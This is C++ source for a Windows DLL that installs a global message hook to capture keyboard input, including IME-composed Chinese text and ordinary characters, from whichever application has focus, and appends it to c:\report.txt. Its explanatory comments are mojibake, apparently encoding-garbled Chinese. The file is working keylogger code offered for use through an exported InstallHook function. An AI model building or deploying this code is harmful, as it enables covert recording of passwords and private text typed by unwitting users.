// WM_IME_COMPOSITION��Ϣ
// 	2007-06-29 08:43
// 	��ǰһֱû��ע�⵽һ������,�����ü��̹��ӽػ��ַ�����ʱ�ǽز��������ַ���,�ȷ�˵�������뷨֮���.
// 	�����õ�����Ϣ����ȥHOOK WM_IME_CHAR,��ʱ��󲿷��Ѿ��ܹ���ȡ��,���Ƕ�������һЩ����,�ȷ�˵
// 	WORD֮���Ҳ�Ͳ��ܽػ���.������MSDN�ϲ鵽, Ҫ�õ�WM_IME_COMPOSITION��Ϣ,�����ڴ������Ϣ
// 	ʱҪ�õ�IMM��һЩ�⺯�������뷨�������л�ȡ.�ȷ�˵ImmGetContext,ImmGetCompositionString�ȵ�.
// ������Դ����:

//HOOK IME TO GET CHINESE INPUT CHAR
//MAKE BY ZWELL
//2004.12.9
//THIS WILL BUILD HOOK.DLL, IF YOU WANT TO USE, JUST USE THE EXPORT FUNCTION INSTALLHOOK
//ADDTION: YOU MUST ADD THE IMM32.LIB INTO PROJECT, OTHERWISE, IT CAN NOT BE PASS...'
#include "windows.h"
#include "imm.h"
#include "stdio.h"
#include <tchar.h>
#pragma comment(lib, "Imm32.lib")

#define HOOK_API __declspec(dllexport)

HHOOK         g_hHook             = NULL;         //hook���
HINSTANCE     g_hHinstance     = NULL;         //������

LRESULT CALLBACK MessageProc(int nCode,WPARAM wParam,LPARAM lParam)
{    
	LRESULT lResult = CallNextHookEx(g_hHook, nCode, wParam, lParam);
	PMSG pmsg = (PMSG)lParam;
	if (nCode == HC_ACTION)
	{

		switch (pmsg->message)
		{
		case WM_IME_COMPOSITION: 
			{
				HIMC hIMC;
				HWND hWnd=pmsg->hwnd;
				DWORD dwSize;
				char ch;
				char lpstr[20];
				if(pmsg->lParam & GCS_RESULTSTR)
				{
					//�Ȼ�ȡ��ǰ��������Ĵ��ڵ����뷨���
					hIMC = ImmGetContext(hWnd);
					if (!hIMC)
					{
						MessageBox(NULL, "ImmGetContext","ImmGetContext", MB_OK);
					}

					POINT pt = {};
					::GetCaretPos(&pt);
					COMPOSITIONFORM info;
					info.dwStyle = CFS_POINT;
					info.ptCurrentPos.x = pt.x;
					info.ptCurrentPos.y = pt.y;
					::ImmSetCompositionWindow(hIMC, &info);

					// �Ƚ�ImmGetCompositionString�Ļ�ȡ������Ϊ0����ȡ�ַ�����С.
					dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);

					// ��������СҪ�����ַ�����NULL��������С,
					//   ���ǵ�UNICODE
					dwSize += sizeof(WCHAR);

					memset(lpstr, 0, 20);

					// �ٵ���һ��.ImmGetCompositionString��ȡ�ַ���
					LONG len = ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);

					//����lpstr���漴������ĺ����ˡ�����Դ���lpstr,��ȻҲ���Ա���Ϊ�ļ�...
					//MessageBox(NULL, lpstr, lpstr, MB_OK);
					FILE* f1;
					f1=fopen("c:\\report.txt","a+");	
					char szBuf[] = "STR:";
					fwrite(&szBuf,1,strlen(szBuf),f1);
					fwrite(lpstr,1,len,f1);
					fclose(f1);   

					ImmReleaseContext(hWnd, hIMC);
				}
			}
			break;
		case WM_CHAR:   //�ػ��򽹵㴰�ڵļ�����Ϣ
			{
				FILE* f1;
				f1=fopen("c:\\report.txt","a+");
				char ch=(char)(pmsg->wParam);
				char szBuf[] = "CHAR:";
				fwrite(&szBuf,1,strlen(szBuf),f1);
				fwrite(&ch,1,1,f1);
				fclose(f1);    
			}
			break;
		}
	}

	return(lResult);
}

HOOK_API BOOL InstallHook()
{
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)MessageProc,g_hHinstance,0);
	return TRUE;
}

HOOK_API BOOL UnHook()
{       
	return UnhookWindowsHookEx(g_hHook);
}

BOOL APIENTRY DllMain( HANDLE hModule,
	DWORD   ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hHinstance=(HINSTANCE)hModule;
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

